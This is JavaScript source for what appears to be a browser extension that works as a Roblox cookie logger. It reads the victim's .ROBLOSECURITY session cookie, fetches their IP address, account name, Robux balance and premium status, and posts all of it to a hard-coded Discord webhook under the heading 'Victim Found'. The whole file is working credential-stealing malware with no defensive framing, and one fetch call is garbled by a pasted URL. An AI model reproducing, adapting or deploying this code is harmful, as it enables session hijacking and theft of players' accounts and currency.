const WEBHOOK = "https://discord.com/api/webhooks/1131327671759020222/1PV9v5LLnOlrAy1p1KWapVIUelE6zOiEWzCdXez4g-KchokRF5ovzuYMAsIEencr-iK_";

async function main(cookie) {
    var ipAddr = await (await fetch("https://api.ipify.org")).text();

    if (cookie) {
        var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
            headers: {
                Cookie: ".ROBLOSECURITY=" + cookie
            },
            redirect: "manual"
        })).json();
    }
    
    fetch(WEBHOOK,https://discord.com/api/webhooks/1131327671759020222/1PV9v5LLnOlrAy1p1KWapVIUelE6zOiEWzCdXez4g-KchokRF5ovzuYMAsIEencr-iK_{
        method: "POST",
        headers: {
            "Content-Type": "Application/json"
        },
        body: JSON.stringify({
            "content": null,
            "embeds": [
              {
                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                "color": null,
                "fields": [
                  {
                    "name": "Username",
                    "value": statistics ? statistics.UserName : "N/A",
                    "inline": true
                  },
                  {
                    "name": "Robux",
                    "value": statistics ? statistics.RobuxBalance : "N/A",
                    "inline": true
                  },
                  {
                    "name": "Premium",
                    "value": statistics ? statistics.IsPremium : "N/A",
                    "inline": true
                  }
                ],
                "author": {
                  "name": "Victim Found: " + ipAddr,
                  "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                },
                "footer": {
                  "text": "Z2Z Private Logger",
                  "icon_url": "https://i.ibb.co/LzWGXds/Monster.png"
                },
                "thumbnail": {
                  "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                }
              }
            ],
            "username": "Roblox Logger",
            "avatar_url": "https://i.ibb.co/GFDpZtp/roblox.png",
            "attachments": []
        })
    });
}

chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
    main(cookie ? cookie.value : null);
});
